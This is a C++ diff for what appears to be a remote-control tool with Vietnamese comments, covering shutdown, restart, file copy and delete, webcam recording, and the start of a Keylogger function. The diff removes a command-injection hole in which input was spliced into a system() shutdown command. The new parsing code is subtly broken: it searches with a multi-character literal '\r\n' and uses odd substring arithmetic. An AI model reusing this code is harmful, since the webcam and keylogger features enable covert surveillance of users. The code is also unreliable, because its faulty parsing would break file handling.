@@ -127,21 +127,51 @@ bool stopService(const std::string& input, std::string& filename) {
 }
 
 bool ShutdownServer(const std::string& input, std::string& filename) {
-    std::string command = "shutdown /s /t " + input;
+#if defined(_WIN32) || defined(_WIN64)
+    // Windows shutdown command with a fixed 30-second timer
+    std::string command = "shutdown /s /t 30";
     int result = system(command.c_str());
+#elif defined(__linux__)
+    // Linux shutdown command with a fixed delay
+    std::string command = "shutdown -h +1";
+    int result = system(command.c_str());
+#elif defined(__APPLE__)
+    // macOS shutdown command with a fixed delay
+    std::string command = "sudo shutdown -h +1";
+    int result = system(command.c_str());
+#else
+    std::cerr << "Unsupported operating system for shutdown.\n";
+    return false;
+#endif
+
     return result == 0;
 }
 
 bool RestartServer(const std::string& input, std::string& filename) {
-    std::string command = "shutdown /r /t " + input;
+#if defined(_WIN32) || defined(_WIN64)
+    // Windows restart command with a fixed 30-second timer
+    std::string command = "shutdown /r /t 30";
     int result = system(command.c_str());
+#elif defined(__linux__)
+    // Linux restart command with a fixed delay
+    std::string command = "shutdown -r +1";
+    int result = system(command.c_str());
+#elif defined(__APPLE__)
+    // macOS restart command with a fixed delay
+    std::string command = "sudo shutdown -r +1";
+    int result = system(command.c_str());
+#else
+    std::cerr << "Unsupported operating system for restart.\n";
+    return false;
+#endif
+
     return result == 0;
 }
 
 bool copyFile(const string& input, string& filename) {
-    int pos = input.find('\n');
+    int pos = input.find('\r\n');
     string sourcePath = input.substr(0, pos);
-    string destinationPath = input.substr(pos + 1);
+    string destinationPath = input.substr(pos + 2, input.size() - pos - 2 - 2);
     if (fs::exists(sourcePath) && fs::is_regular_file(sourcePath)) {
         cout << "File nguon hop le.\n";
         try {
@@ -164,7 +194,8 @@ bool copyFile(const string& input, string& filename) {
 }
 
 bool deleteFile(const string& input, string& filename) {
-    string filePath = input;
+    int pos = input.find('\r\n');
+    string filePath = input.substr(0, pos);
     try {
         if (fs::exists(filePath)) {
             fs::remove(filePath);
@@ -239,8 +270,13 @@ bool webCam(const string& input, string& filename) {
     //Kich thuoc khung hinh
     int frame_width = static_cast<int>(cap.get(CAP_PROP_FRAME_WIDTH));
     int frame_height = static_cast<int>(cap.get(CAP_PROP_FRAME_HEIGHT));
-    string output_file = "output.mp4";
-    VideoWriter writer(output_file, VideoWriter::fourcc('H', '2', '6', '4'), 30, Size(frame_width, frame_height));
+    string output_file = "fame.avi";
+    VideoWriter writer(output_file, VideoWriter::fourcc('M', 'J', 'P', 'G'), 30, Size(frame_width, frame_height));
+    if (!writer.isOpened()) {
+        cerr << "Error: Could not open the video writer.\n";
+        return false;
+    }
+    
     while (1) {
         cap.read(img);
         if (img.empty()) {
@@ -262,6 +298,7 @@ bool webCam(const string& input, string& filename) {
     filename = output_file;
     return 1;
 }
+
 
 bool Keylogger(const string& input, string& filename) {
     ofstream logFile("log.txt");
